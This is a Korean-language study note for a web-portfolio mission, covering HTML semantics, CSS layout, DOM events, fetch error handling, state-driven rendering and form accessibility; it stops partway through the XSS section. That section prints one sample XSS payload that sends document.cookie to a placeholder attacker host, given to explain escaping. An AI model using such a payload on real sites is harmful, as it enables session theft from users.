# B1-1 web-portfolio — 학습 노트

> 이 노트만 들고 평가에 들어간다. **판단 기준: 노트를 덮고도 말할 수 있는가.**
> 빈칸은 내가 채운다. AI가 대신 채운 문장은 구술에서 그대로 무너진다.
> 채울 때 규칙: 코드를 베끼지 말고 **흐름**을 쓴다. 남의 정의를 옮기지 말고 **내 코드의 어디에 있는지**를 쓴다.

## 1. 미션 요약

- 무엇을 만들었나 (3줄):
- 핵심 기술 키워드: HTML 시맨틱 / CSS 변수·Flex·Grid / DOM·이벤트 / async·fetch / 상태-렌더링
- 제출물: repo URL · 배포 URL · 스크린샷 3종

---

## 2. 개념 카드 (C)

각 카드는 `MISSION_SPEC.md` §5의 C-ID와 1:1이다.

> **읽는 법**: 설명은 정리본이다. **✍️ 표시 칸은 반드시 직접 채운다.**
> 구술 평가에서 실제로 물어보는 건 "개념의 정의"가 아니라 **"네 코드의 어디에서 그걸 썼고 왜 그렇게 정했나"**다.
> 정리본만 읽고 들어가면 항목 3은 통과해도 항목 2·4에서 무너진다.

---

### C-1. 시맨틱 태그와 문서 구조 설계 기준 → R-4~R-13 / E-1.1, E-2.1, E-3.1

**왜 쓰는가 — `div`로만 짜면 무엇이 깨지는가**

`<div class="header">`와 `<header>`는 화면에 똑같이 그려진다. 차이는 **기계가 읽을 때** 생긴다.

| 대상 | div만 썼을 때 | 시맨틱 태그를 썼을 때 |
|---|---|---|
| 스크린리더 | 처음부터 끝까지 순서대로 읽는 수밖에 없다 | 랜드마크로 "본문으로 건너뛰기", "내비게이션으로 이동"이 가능 |
| 검색엔진 | 어디가 본문인지 추측한다 | `<main>`을 본문으로, `<nav>`를 메뉴로 인식 |
| 사람 | `class` 이름에 의존 | 태그만 보고 구조 파악 |

**태그별 판단 기준**

- `<header>` — 페이지나 섹션의 머리말. 페이지에 하나만 있으란 법은 없다(각 `<article>`도 가질 수 있다)
- `<nav>` — **주요** 내비게이션. 푸터의 잡다한 링크 묶음까지 `<nav>`로 감싸지 않는다
- `<main>` — **페이지당 정확히 하나.** 반복되지 않는 핵심 콘텐츠. 헤더/푸터는 들어가지 않는다
- `<section>` — 주제로 묶인 덩어리. **제목(`<h2>` 등)을 가지는 게 원칙**이다. 제목을 붙일 수 없으면 `<div>`가 맞다
- `<article>` — **떼어내도 그 자체로 말이 되는** 독립 단위. 이 과제에서는 **GitHub 저장소 카드 하나가 `<article>`**이다
- `<footer>` — 꼬리말. 저작권, 소셜 링크
- `<div>` — 의미가 없고 순전히 스타일링을 위한 상자일 때. **의미가 없다는 게 곧 사용 이유다**

**`section` vs `article` 한 줄 판별법**: RSS 피드에 개별 항목으로 실려도 말이 되면 `article`, 아니면 `section`.

**제목 계층**: `<h1>`은 페이지에 하나(Hero), 각 섹션은 `<h2>`. 크기 때문에 `<h3>`을 쓰는 건 잘못이다 — 크기는 CSS가 정한다.

**`alt` 속성** (R-12)

- 이미지를 못 보는 사람에게 **같은 정보를 전달하는 대체 텍스트**다. "프로필 사진"이 아니라 "웃고 있는 OOO의 프로필 사진"처럼 내용을 쓴다
- 장식용 이미지는 `alt=""`로 **비운다.** 생략(`alt` 없음)과 다르다 — 비우면 스크린리더가 건너뛰고, 생략하면 파일명을 읽어버린다

**`<label for>` ↔ `<input id>`** (R-13)

- 연결되면 라벨 클릭만으로 입력창에 포커스가 간다(터치 영역 확대)
- 스크린리더가 입력창에 도달했을 때 **그 입력이 무엇인지** 읽어준다. 연결이 없으면 "편집창"이라고만 말한다

**✍️ 내가 채울 것**
- 내 섹션을 `section`/`article`로 나눈 기준:
- `div`를 남긴 곳과 그 이유:
- 처음에 잘못 알았던 것:

---

### C-2. Flexbox vs Grid → R-17, R-18 / E-2.2, E-3.2

**한 줄 차이**

| | Flexbox | Grid |
|---|---|---|
| 차원 | **1차원** — 한 축(행 또는 열) | **2차원** — 행과 열을 동시에 |
| 주도권 | **콘텐츠**가 크기를 정한다 | **컨테이너**가 트랙을 먼저 정한다 |
| 쓸 때 | 한 줄에 늘어놓고 간격/정렬 | 격자 배치, 열 수가 화면폭에 따라 변할 때 |

**이 과제에서 배치가 지정된 이유** (원문이 nav=Flex, 카드=Grid로 못 박았다)

- **nav** — 로고와 메뉴를 한 줄에 놓고 양끝으로 미는 일. 축이 하나다. `display:flex; justify-content:space-between; align-items:center` 세 줄이면 끝난다. Grid로도 되지만 트랙을 정의하는 수고가 헛돈다
- **Projects 카드** — 화면폭에 따라 1열 → 2열 → 3열로 바뀌어야 한다. Flex로 하면 `flex-wrap`과 `flex-basis`로 흉내는 내지만 **마지막 줄이 꽉 차지 않았을 때 카드가 늘어나 버린다.** Grid는 트랙이 고정되어 그 문제가 없다

**`repeat(auto-fit, minmax(280px, 1fr))` 해체**

```css
grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
```

| 조각 | 하는 일 |
|---|---|
| `repeat(...)` | 같은 규칙의 트랙을 반복 정의 |
| `auto-fit` | **몇 개가 들어갈지 브라우저가 계산한다.** 미디어 쿼리 없이 열 수가 변하는 핵심 |
| `minmax(280px, 1fr)` | 각 열은 **최소 280px**, 남는 공간은 **똑같이 나눠 가짐** |
| `1fr` | fraction. 남은 공간의 비율 단위 |

→ 폭 900px이면 280×3=840이 들어가므로 3열, 600px이면 2열, 400px이면 1열. **미디어 쿼리 0줄.**

**`auto-fit` vs `auto-fill`** (거의 반드시 나오는 꼬리질문)

- `auto-fill` — 들어갈 수 있는 만큼 트랙을 **만들어 둔다.** 내용이 없으면 **빈 트랙이 자리를 차지**한다
- `auto-fit` — 빈 트랙을 **접는다.** 그래서 카드 2개만 있으면 두 카드가 폭을 나눠 갖는다

**간격**: `gap`을 쓴다. `margin`으로 카드 사이를 벌리면 가장자리 여백까지 딸려와 보정 코드가 붙는다.

**✍️ 내가 채울 것**
- 내 `minmax` 최소값을 몇으로 정했고 왜:
- Flex를 쓴 다른 곳:

---

### C-3. DOM 선택 → 이벤트 바인딩 → 이벤트 객체 → R-24~R-31 / E-3.2

**흐름 3단계**

```
1. 선택   querySelector('#btn')        → 요소를 잡는다
2. 바인딩 el.addEventListener('click', handler) → "이 일이 일어나면 이 함수를 불러라"
3. 실행   handler(event)               → 브라우저가 event 객체를 넘겨 호출
```

**선택**

| | 반환 | 주의 |
|---|---|---|
| `querySelector` | **첫 번째** 요소 또는 `null` | 없으면 `null`. `null.textContent`는 즉시 에러 |
| `querySelectorAll` | **정적** NodeList | `forEach`는 되지만 `map`은 **안 된다**. `Array.from(...)` 또는 `[...nodes]`로 배열화 |

"정적"이란: 호출 시점의 스냅샷이다. 이후 추가된 요소는 들어 있지 않다.

**`addEventListener`가 `onclick` 속성보다 나은 이유** (R-26의 근거)

1. **여러 개를 붙일 수 있다.** `onclick`은 나중 것이 앞의 것을 덮어쓴다
2. **HTML과 동작이 분리된다.** 마크업만 봐도 구조를 읽을 수 있다
3. `{ once: true }`, `{ passive: true }` 같은 옵션을 쓸 수 있고 `removeEventListener`로 해제할 수 있다

**`event` 객체**

- `event.target` — **실제로 이벤트가 난** 요소 (클릭된 그 지점)
- `event.currentTarget` — **리스너를 붙인** 요소
- `event.preventDefault()` — **브라우저의 기본 동작**을 막는다
  - 폼 `submit`: 페이지를 새로고침하며 서버로 전송하는 동작을 막는다 (R-43에서 필수)
  - 앵커 `click`: 주소 이동을 막는다
- `event.stopPropagation()` — 부모로의 전파(버블링)를 막는다. `preventDefault`와 **다른 일**이다

**⚠️ 이벤트 위임 — 이 과제에서 반드시 걸리는 함정**

에러 상태의 "다시 시도" 버튼(R-51)은 `innerHTML`로 **나중에 만들어진다.** 페이지 로드 시점에 없으므로 그때 `querySelector`로 잡아 리스너를 붙이면 `null`이다. 게다가 `innerHTML`을 다시 대입하면 **기존 요소와 리스너가 통째로 사라진다.**

해법은 **부모에 한 번만 붙이고 버블링으로 받는 것**:

```js
projectsGrid.addEventListener('click', (event) => {
  if (event.target.closest('[data-retry]')) loadRepos();
});
```

**`defer`가 필요한 이유** (R-24)

`<script>`를 그냥 `<head>`에 두면 HTML 파싱 **도중**에 실행되어 `querySelector`가 `null`을 반환한다. `defer`는 **HTML 파싱이 끝난 뒤** 실행하도록 미룬다. (`type="module"`은 기본적으로 defer로 동작한다.)

**내용 변경 3종**

| | 용도 | 주의 |
|---|---|---|
| `textContent` | 순수 텍스트 | **안전하다.** 태그가 문자로 들어간다 |
| `innerHTML` | HTML 문자열 | 외부 데이터를 넣으면 XSS. → C-4·E-4.2 |
| `classList` | `add`/`remove`/`toggle`/`contains` | 스타일은 CSS에 두고 **클래스만 조작**한다 |

**✍️ 내가 채울 것**
- 내가 이벤트 위임을 쓴 곳:
- `querySelector`가 `null`을 반환해서 막혔던 경험:

---

### C-4. ES6+ — const/let · 화살표 함수 · 구조분해 · 배열 메서드 → R-44~R-47 / E-3.3

**`const`/`let`이 `var`보다 나은 점** (R-25의 근거)

| | 스코프 | 재선언 | 호이스팅 |
|---|---|---|---|
| `var` | **함수** 스코프 | 가능 | 선언이 끌어올려지고 `undefined`로 초기화 |
| `let`/`const` | **블록**(`{}`) 스코프 | 불가 | 끌어올려지되 선언 전 접근은 에러(TDZ) |

`var`는 `if`나 `for` 블록 밖으로 새어 나가 의도치 않은 덮어쓰기를 만든다. **기본은 `const`, 재할당이 필요할 때만 `let`.** `const` 객체의 내부 속성은 바꿀 수 있다(재할당만 막는다).

**화살표 함수**

```js
const toCard = (repo) => `<article>...</article>`;
```

- 짧다. 그리고 **`this`를 자기가 만들지 않고 바깥 것을 그대로 쓴다**(렉시컬 this). 콜백 안에서 `this`가 뒤바뀌는 고전적 버그가 사라진다
- 반대로 **객체의 메서드로는 부적합**하다 — `this`가 그 객체를 가리키지 않는다

**구조분해 할당**

```js
const { name, html_url, stargazers_count, language } = repo;
const { name: repoName = '이름 없음' } = repo;   // 이름 변경 + 기본값
```

GitHub API 응답은 필드가 수십 개다. 쓸 것만 꺼내면 이후 코드에서 `repo.` 반복이 사라지고 **이 함수가 무엇에 의존하는지가 첫 줄에 드러난다.**

**배열 메서드**

| | 반환 | 용도 |
|---|---|---|
| `map` | **새 배열** | 변환. 저장소 객체 → HTML 문자열 (R-47) |
| `filter` | **새 배열** | 조건 선별. 보너스 언어 필터 |
| `forEach` | `undefined` | 순회만. **체이닝 불가** |

```js
grid.innerHTML = repos.map(toCard).join('');
```

`for`문 대비 이점: **무엇을 하는지가 이름에 있다.** 인덱스 변수, 길이 비교, 배열 초기화 같은 부수적 코드가 사라지고 중간 상태를 만들 일이 없다.

> `map`이 반환한 배열을 안 쓸 거면 `forEach`를 써야 한다. 반환값을 버리는 `map`은 읽는 사람을 헷갈리게 한다.

**템플릿 리터럴** (R-45) — 백틱 문자열. `${}`로 값을 끼워 넣고 줄바꿈이 그대로 유지된다.

**같이 쓰게 되는 것들**: 스프레드 `{...state}`, 옵셔널 체이닝 `repo?.owner?.login`, 널 병합 `language ?? '기타'`

**✍️ 내가 채울 것**
- 구조분해를 쓴 위치:
- `map`을 쓴 위치와, 거기서 `forEach`가 아닌 이유:

---

### C-5. fetch · async/await · 에러 처리 → R-48~R-54 / E-1.4, E-2.4, E-3.4

**Promise** — 지금은 없지만 나중에 생길 값. `pending` → `fulfilled` 또는 `rejected`.

**async/await** — Promise를 동기 코드처럼 쓰게 해주는 문법.

- `async` 함수는 **항상 Promise를 반환**한다
- `await`는 그 Promise가 결정될 때까지 **그 함수만** 멈춘다. 브라우저 전체는 멈추지 않는다

```js
const res = await fetch(url);      // 응답 헤더 도착까지 대기
const data = await res.json();     // 본문 파싱도 비동기 → await 필요
```

**⚠️ 이 과제 최대의 함정 — `fetch`는 404·403에서 reject하지 않는다**

`fetch`는 **서버가 응답을 주기만 하면 성공**으로 본다. 404든 403이든 500이든 "응답이 왔다"는 사실은 같기 때문이다.

```js
// ✗ 틀렸다 — 404가 와도 catch로 가지 않는다. 빈 화면만 남는다
try {
  const res = await fetch(url);
  const repos = await res.json();
  render(repos);
} catch (e) { showError(); }

// ✓ 맞다 — 상태 코드를 직접 확인해서 던진다
const res = await fetch(url);
if (!res.ok) throw new Error(`GitHub API ${res.status}`);
```

`fetch`가 실제로 reject하는 경우는 **네트워크 자체가 실패**했을 때다 — 오프라인, DNS 실패, CORS 차단, 요청 중단.

→ R-51(에러 UI)과 R-54(403 레이트 리밋)는 **`res.ok` 확인 없이는 절대 동작하지 않는다.**

**try / catch / finally와 4상태의 배치**

```js
setState({ status: 'loading' });        // ① 요청 직전
try {
  const res = await fetch(url);
  if (!res.ok) throw new Error(res.status);
  const repos = await res.json();
  setState({ status: repos.length ? 'success' : 'empty', repos });  // ②③
} catch (error) {
  setState({ status: 'error' });        // ④
}
```

- 로딩 해제를 `finally`에 두지 않는 이유: 여기서는 **로딩이 독립된 플래그가 아니라 `status` 값 중 하나**다. 다음 상태로 덮어써지므로 따로 끌 필요가 없다. `isLoading` 불린을 따로 뒀다면 `finally`가 맞다
- **빈 상태는 에러가 아니다.** 요청은 성공했고 결과가 0건일 뿐이라 `success` 분기 안에서 갈라진다

**✍️ 내가 채울 것**
- 내 코드에서 `res.ok`를 확인한 위치:
- 에러를 일부러 내보려고 한 방법과 그때 화면:

---

### C-6. 이벤트 → 상태 → 렌더링 (이 과제의 핵심) → R-55 / E-2.4, E-3.5, E-4.4

**한 문장**: 사용자가 무언가 하면 → **상태 값**을 바꾸고 → 바뀐 상태를 보고 **화면을 다시 그린다.** 화면을 직접 건드리지 않는다.

```
[이벤트]          [상태]                    [렌더링]
클릭/입력/스크롤 → setState({ ... })  →  화면이 상태를 그대로 반영
      ↑                                        │
      └──────────── 단방향. 역방향 화살표 없음 ─┘
```

**왜 이렇게 하는가**

DOM을 직접 고치는 방식은 기능이 2~3개일 때는 더 짧다. 문제는 기능이 얽힐 때 생긴다. "다크 모드가 켜져 있고 + 필터가 걸려 있고 + 로딩 중"인 상태를 DOM에서 역산하려면 클래스를 하나씩 확인해야 하고, 확인 순서가 틀리면 화면이 어긋난다. **상태를 한곳에 모아두면 화면은 그 함수의 결과일 뿐**이 된다.

**우리 설계 (설계 결정 #3)**

```js
// state.js — 상태는 여기 하나뿐
const state = { theme: 'light', status: 'idle', repos: [], errors: {} };
const listeners = [];
export const setState = (patch) => {
  Object.assign(state, patch);
  listeners.forEach((fn) => fn({ ...state }));   // 상태가 바뀌면 렌더가 돈다
};
```

**⚠️ 지켜야 할 규칙: 상태를 DOM에서 읽지 않는다**

```js
// ✗ DOM이 상태의 주인이 되어 흐름이 양방향이 된다
const isDark = document.body.classList.contains('dark');

// ✓ 상태가 주인이고 DOM은 결과다
const { theme } = getState();
```

이 규칙이 깨지면 E-3.5에 답할 수 없다. 답할 근거가 코드에 없기 때문이다.

**React와의 대응** (E-4.4는 사실상 이걸 묻는다)

| 이 과제 | React |
|---|---|
| `state` 객체 | `useState` / `useReducer`의 상태 |
| `setState(patch)` | `setX(...)` setter |
| 구독된 렌더 함수 | 컴포넌트 함수의 재실행(리렌더링) |
| 템플릿 리터럴 문자열 | JSX |
| `addEventListener` | `onClick` prop |
| 수동 `innerHTML` 교체 | 가상 DOM diff |

**즉 React가 자동으로 해주는 일을 여기서는 손으로 한다.** 그래서 이 과제를 제대로 하면 React가 "왜 그렇게 생겼는지"가 설명된다.

**✍️ 내가 채울 것**
- 내 상태 3개의 이름:
- 흐름을 어긴 곳이 있다면 어디, 왜:

---

### C-7. CSS 변수 · data-theme · localStorage → R-15, R-16, R-36, R-37 / E-1.3, E-2.3, E-3.6

**CSS 변수(사용자 지정 속성)**

```css
:root { --bg: #ffffff; --text: #1a1a1a; }
body { background: var(--bg); color: var(--text); }
```

일반 CSS 속성처럼 **상속된다.** `:root`(= `<html>`)에 정의하면 문서 전체가 물려받는다. 그래서 **루트의 변수 값만 바꾸면 그 변수를 쓰는 모든 규칙이 한꺼번에 바뀐다.** 테마 전환이 한 줄로 끝나는 이유다.

**`[data-theme="dark"]` 방식** (R-16 — 원문 지정)

```css
:root                  { --bg: #ffffff; --text: #1a1a1a; }
[data-theme="dark"]    { --bg: #12141a; --text: #e8e8e8; }
```

```js
document.documentElement.dataset.theme = 'dark';   // <html data-theme="dark">
```

**⚠️ 선언 순서가 중요하다.** `:root`(의사 클래스)와 `[data-theme]`(속성 선택자)는 **명시도가 같다**. 명시도가 같으면 **나중에 선언된 쪽이 이긴다.** 다크 블록을 `:root`보다 위에 쓰면 적용되지 않는다.

**클래스 토글(`.dark`)과의 차이** — 기능은 같다. 다만 `data-*`는 **값을 가질 수 있어** 테마가 셋 이상(light/dark/sepia)으로 늘 때 클래스를 붙였다 뗐다 하지 않고 값만 바꾸면 된다. 의미도 더 분명하다(클래스는 "스타일 묶음", 데이터 속성은 "상태 값").

**localStorage** (R-37)

| 성질 | 내용 |
|---|---|
| 저장 형태 | **문자열만.** 객체는 `JSON.stringify` 필요 |
| 수명 | 명시적으로 지우기 전까지. (`sessionStorage`는 탭을 닫으면 사라진다) |
| 범위 | 오리진(도메인)별. 동기 API |
| 실패 | 사생활 모드·저장 공간 초과에서 **예외를 던진다** → `try/catch` 권장 |

```js
localStorage.setItem('theme', 'dark');            // 쓰기: 토글한 직후
const saved = localStorage.getItem('theme');      // 읽기: 페이지 초기화 시점
```

**⚠️ 테마 깜빡임(FOUC)** — E-3.6의 핵심

JS를 `defer`로 불러오면 **HTML 파싱이 끝난 뒤** 실행된다. 즉 브라우저는 저장된 테마를 알기 전에 **기본(라이트) 화면을 이미 한 번 그린다.** 그 직후 스크립트가 다크로 바꾸므로 **흰 화면이 번쩍이고 어두워진다.**

| 대응 | 방법 | 비용 |
|---|---|---|
| A | `<head>`에 테마만 읽어 적용하는 짧은 인라인 `<script>` | 가장 확실. 단 스크립트 하나가 인라인이 된다 |
| B | `@media (prefers-color-scheme: dark)`로 초기값을 시스템 설정에 맞춤 | 보너스 B-4와 겹쳐 이득. 저장값과 시스템이 다르면 여전히 깜빡임 |
| C | 감수하고 README에 명시 | 비용 0. 평가에서 "알고 있는가"를 물으면 답할 수 있어야 함 |

> 제약사항의 "인라인 스타일 금지"는 `style="..."` **속성**을 말한다. A안의 인라인 스크립트와는 다른 이야기다. 다만 R-24가 "JS 파일을 defer로 연결"을 요구하므로, A를 택한다면 **본체는 defer 파일로 두고 테마 선적용만 인라인**으로 분리해야 한다.

**✍️ 내가 채울 것**
- 내가 고른 대응(A/B/C)과 이유:
- localStorage 키 이름과 저장한 값의 형태:

---

### C-8. 모바일 퍼스트와 미디어 쿼리 → R-19~R-21 / E-2.2

**모바일 퍼스트** = 기본 CSS를 **모바일 기준**으로 쓰고, `min-width`로 큰 화면을 덮어쓴다.

```css
/* 기본 = 모바일 */
.nav-menu { display: none; }

@media (min-width: 768px) {   /* 태블릿 이상 */
  .nav-menu { display: flex; }
  .hamburger { display: none; }
}
@media (min-width: 1024px) { /* 데스크톱 */ }
```

**왜 `max-width`(데스크톱 퍼스트)보다 나은가**

- 모바일은 **제약이 가장 큰 환경**이다. 좁은 폭에서 성립하는 레이아웃을 먼저 만들면 이후는 **더하는** 일만 남는다. 반대로 하면 **되돌리는**(`float: none`, `width: auto`) 코드가 계속 붙는다
- 작은 화면 기기가 큰 화면용 CSS를 내려받아 무시하는 낭비가 없다

**뷰포트 메타 태그가 없으면 전부 무의미하다**

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
```

없으면 모바일 브라우저가 980px짜리 가상 화면으로 렌더한 뒤 축소해 보여준다. 미디어 쿼리가 안 먹는 게 아니라 **애초에 폭을 다르게 인식한다.**

**브레이크포인트 768 / 1024** (R-20) — 특정 기기 크기를 노린 값이 아니라 관례적인 태블릿·데스크톱 경계다. 원칙적으로는 **레이아웃이 깨지는 지점**에서 정하는 게 맞지만, 이 과제는 값이 지정되어 있다.

**✍️ 내가 채울 것**
- 768px에서 실제로 바뀌는 것:
- 1024px에서 실제로 바뀌는 것:

---

### C-9. Intersection Observer → R-38 / E-4.5

**scroll 이벤트로 만들면 생기는 문제**

```js
// ✗ 스크롤 한 번에 수십~수백 번 실행된다
window.addEventListener('scroll', () => {
  els.forEach((el) => {
    const rect = el.getBoundingClientRect();   // ← 강제 동기 레이아웃
    ...
  });
});
```

`getBoundingClientRect()`는 정확한 위치를 얻기 위해 브라우저에게 **레이아웃을 지금 당장 계산**하라고 강요한다(강제 리플로우). 이게 스크롤마다, 요소마다 일어나면 메인 스레드가 막혀 스크롤이 끊긴다. 완화하려면 쓰로틀·`requestAnimationFrame`을 얹어야 하고 코드가 늘어난다.

**Intersection Observer**

요소가 뷰포트(또는 지정 영역)와 **교차할 때만** 브라우저가 알려준다. 감시는 브라우저 내부에서 비동기로 이뤄져 메인 스레드를 막지 않는다.

```js
const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (!entry.isIntersecting) return;
    entry.target.classList.add('visible');
    observer.unobserve(entry.target);   // 한 번만 실행
  });
}, { threshold: 0.2 });

document.querySelectorAll('.reveal').forEach((el) => observer.observe(el));
```

- **`threshold: 0.2`** = 요소의 **20%가 보이면** 콜백 실행. `0`이면 1px만 걸쳐도, `1`이면 전부 보여야 발동
- **`unobserve`** — 등장 애니메이션은 한 번이면 된다. 해제하지 않으면 스크롤을 오르내릴 때마다 반복된다
- `rootMargin`으로 발동 시점을 앞당기거나 미룰 수 있다

**접근성**: `@media (prefers-reduced-motion: reduce)`에서는 애니메이션을 끄는 게 좋다. 움직임에 민감한 사용자가 있다.

**✍️ 내가 채울 것**
- 내 threshold 값과 그렇게 정한 이유:
- `unobserve`를 호출한 위치:

---

### C-10. GitHub API 레이트 리밋 → R-54 / E-4.3

**제한**

| 인증 | 한도 | 기준 |
|---|---|---|
| 없음 | **시간당 60회** | **IP 단위** |
| 토큰 | 시간당 5,000회 | 사용자 단위 |

**IP 단위**라는 게 중요하다. 같은 공용 와이파이·카페에서 여러 명이 새로고침하면 내 몫이 먼저 닳을 수 있다.

**초과하면**

- 상태 코드 **403** (간혹 429). `fetch`는 reject하지 않으므로 **`res.ok`로 잡아야 한다**(C-5)
- 응답 헤더 `X-RateLimit-Remaining: 0`, `X-RateLimit-Reset`(복구 시각, Unix time)

**토큰을 넣으면 안 되는 이유** — 이 과제는 순수 프론트엔드다. 토큰을 JS 파일에 적으면 **public repo와 배포된 사이트 양쪽에 그대로 공개**된다. 누구나 내 토큰으로 API를 호출할 수 있다. 그래서 **비인증 60회 제한을 받아들이고 그 안에서 설계**하는 것이 맞다.

**대응 설계**

1. **에러 상태 UI + 재시도 버튼** (R-51, R-54) — 최소 요구사항
2. **메시지 구분** — 404("사용자를 찾을 수 없습니다")와 403("요청이 많아 잠시 후 다시 시도해 주세요")은 사용자가 할 일이 다르다. `res.status`로 갈라주면 E-4.3 답변이 깊어진다
3. **캐싱** — 응답을 `localStorage`에 타임스탬프와 함께 저장하고 일정 시간(예: 10분) 안이면 재사용. 저장소 목록은 자주 바뀌지 않으므로 손해가 거의 없다
4. 새로고침 연타를 피한다 (원문 §7 주의사항)

**✍️ 내가 채울 것**
- 403과 404를 구분했는가, 어떻게:
- 캐싱을 넣었다면 TTL과 그 근거:

### C-11. 스크롤 제어와 scroll 이벤트 → R-30, R-33~R-35 / E-1.2

**부드러운 스크롤 두 가지 방법** (R-33)

```css
html { scroll-behavior: smooth; }     /* ① CSS 한 줄. 앵커 기본 동작에 자동 적용 */
```
```js
target.scrollIntoView({ behavior: 'smooth', block: 'start' });  /* ② JS. 조건부 제어 가능 */
```

①은 `<a href="#about">`의 기본 동작을 그대로 두고 부드럽게만 만든다. ②는 `preventDefault()`로 기본 이동을 막고 직접 스크롤하는 방식이라, 모바일에서 메뉴를 닫으면서 이동하는 식의 **추가 동작을 끼워 넣을 때** 필요하다.

**⚠️ 고정 헤더가 제목을 덮는 문제** — 앵커로 이동하면 섹션 최상단이 뷰포트 최상단에 붙는데, 그 자리에 고정 헤더가 있으면 제목이 가려진다. `top: -80px` 같은 보정 요소를 넣는 편법이 흔하지만 CSS 한 줄이면 된다.

```css
section { scroll-margin-top: 80px; }   /* 스크롤 목적지만 80px 아래로 */
```

**scroll 이벤트** (R-34, R-35 — R-30이 요구하는 `scroll` 이벤트가 여기 쓰인다)

```js
window.addEventListener('scroll', onScroll, { passive: true });
```

- `window.scrollY` — 문서 최상단에서 현재까지 스크롤된 픽셀. 이 값을 임계값(300 / 60)과 비교한다
- **`{ passive: true }`** — "이 핸들러는 `preventDefault()`를 쓰지 않는다"는 약속. 브라우저가 핸들러 실행을 기다리지 않고 스크롤을 먼저 처리해 끊김이 줄어든다
- 스크롤 이벤트는 **한 번의 스크롤에 수십 번** 발생한다. 매번 DOM을 건드리면 낭비다

```js
// ✗ 스크롤 내내 매번 classList 조작
if (window.scrollY > 300) topBtn.classList.add('visible');

// ✓ 상태가 바뀔 때만 조작 — 상태→렌더링 원칙(C-6)과도 일치
const shouldShow = window.scrollY > 300;
if (shouldShow !== getState().topVisible) setState({ topVisible: shouldShow });
```

더 줄여야 하면 `requestAnimationFrame`으로 프레임당 1회로 묶는다(쓰로틀).

**C-9(Intersection Observer)와의 역할 분담** — 헷갈리기 쉬운 지점이다.

| 묻는 것 | 도구 |
|---|---|
| "이 요소가 화면에 보이나?" | **Intersection Observer** (R-38 스크롤 애니메이션) |
| "얼마나 스크롤했나?" (300px / 60px) | **scroll 이벤트** (R-34, R-35) |

IO는 특정 요소와의 교차만 알려줄 뿐 스크롤 양을 주지 않는다. 그래서 이 과제에는 **둘 다** 필요하다.

**접근성**: `@media (prefers-reduced-motion: reduce)`에서는 `scroll-behavior: auto`로 되돌린다. 부드러운 스크롤이 어지럼증을 유발하는 사용자가 있다.

**✍️ 내가 채울 것**
- 부드러운 스크롤을 ①/② 중 무엇으로 했고 왜:
- 임계값 300 / 60을 그대로 썼는가, 바꿨다면 근거:

---

### C-12. 폼 검증과 접근성 → R-39~R-43 / E-1.5, E-2.5

**브라우저가 이미 해주는 것 — Constraint Validation API**

```html
<input type="email" id="email" required />
```

`required`와 `type="email"`만으로 브라우저가 검증하고 말풍선을 띄운다. JS로도 결과를 읽을 수 있다.

```js
input.checkValidity();          // true / false
input.validity.valueMissing;    // 비어 있음
input.validity.typeMismatch;    // 형식 불일치
```

**그런데 왜 직접 만드는가** — 기본 말풍선은 **위치·문구·디자인을 제어할 수 없고**, 하나씩 순서대로만 뜬다. R-42는 "에러 메시지가 **입력 필드 근처**에 표시"를 요구하므로 기본 UI로는 충족되지 않는다.

```html
<form novalidate>   <!-- 기본 말풍선을 끄고 직접 표시한다 -->
```

`novalidate`를 걸어도 `checkValidity()`는 그대로 쓸 수 있다. **검증 로직은 브라우저 것을 쓰고 표시만 직접** 하는 조합이 제일 적은 코드다.

**이메일 정규식의 한계** (E-3.1 꼬리질문에 자주 나온다)

RFC 5322를 완전히 만족하는 정규식은 사실상 쓸 수 없을 만큼 길다. 실무에서는 **명백한 오타만 걸러내는 수준**으로 충분하다.

```js
const EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
```

**정규식으로는 그 주소가 실제로 존재하는지 알 수 없다.** 진짜 검증은 확인 메일을 보내는 것뿐이다 — 이 한 줄을 말할 수 있으면 이해도가 드러난다.

**검증 시점** (설계 결정 #5)

| 시점 | 동작 |
|---|---|
| `submit` | 전체 필드 검증 → 실패하면 `preventDefault()`하고 에러 표시 |
| `input` | **한 번이라도 제출해 에러가 난 필드만** 다시 검증해 에러를 해제 |

- 처음부터 `input`으로 검증하면 이름 한 글자 쳤을 때 "형식이 올바르지 않습니다"가 떠 공격적이다
- `submit`만 쓰면 사용자가 고쳐도 에러 메시지가 그대로 남아 고쳐진 건지 알 수 없다
- 이 "제출 후부터 실시간"을 **touched 패턴**이라 부른다. React Hook Form 등이 쓰는 것과 같은 개념이다

**접근성 — 에러 메시지는 보이기만 해선 안 된다**

```html
<label for="email">이메일</label>
<input type="email" id="email" aria-describedby="email-error" aria-invalid="true" />
<p id="email-error" role="alert">이메일 형식이 올바르지 않습니다.</p>
```

| 속성 | 역할 |
|---|---|
| `aria-describedby` | 입력과 에러 메시지를 **연결**한다. 스크린리더가 입력에 들어갈 때 함께 읽는다 |
| `aria-invalid` | 이 입력이 현재 유효하지 않음을 알린다 |
| `role="alert"` | 메시지가 나타나는 **즉시** 읽어준다 |

성공 메시지(R-43)는 `role="status"`가 적절하다 — 급하지 않게 알린다.

**✍️ 내가 채울 것**
- 브라우저 검증(`checkValidity`)을 썼는가, 직접 정규식을 썼는가, 그 이유:
- 에러 메시지에 ARIA를 붙였는가:

---

### C-13. XSS와 안전한 렌더링 → 설계 결정 #4 / E-4.2

**무엇이 문제인가**

`innerHTML`은 대입된 문자열을 **HTML로 파싱한다.** 태그가 들어 있으면 태그로 해석된다.

GitHub API의 `name`·`description`은 **사람이 입력한 값**이다. 저장소 설명에 이런 걸 넣을 수 있다.

```
<img src=x onerror="fetch('https://공격자/steal?c='+document.cookie)">
```

이 문자열이 그대로 `innerHTML`에 들어가면 **내 사이트에서 그 스크립트가 실행된다.** 이것이 XSS(Cross-Site Scripting)다.

> 참고: `innerHTML`로 삽입된 `<script>` 태그는 실행되지 않는다. 그래서 공격은 주로 **`onerror`·`onload` 같은 이벤트 핸들러 속성**을 통해 들어온다. "script만 막으면 된다"는 오해를 조심한다.

이 과제에서는 내 저장소만 불러오니 당장은 내가 나를 공격하는 꼴이라 피해가 없다. 하지만 **사용자명을 입력받는 기능으로 확장하는 순간 실제 취약점**이 되고, 평가는 그 확장을 묻는다.

**대응 3계층**

| | 방법 | 이 과제에서 |
|---|---|---|
| ① | `textContent`로 넣는다 — 태그가 문자로 들어가 가장 안전 | R-45가 템플릿 리터럴을 요구해 전면 적용은 불가 |
| ② | **삽입 직전 이스케이프** — `& < > " '`를 엔티티로 치환 | **채택** (설계 #4) |
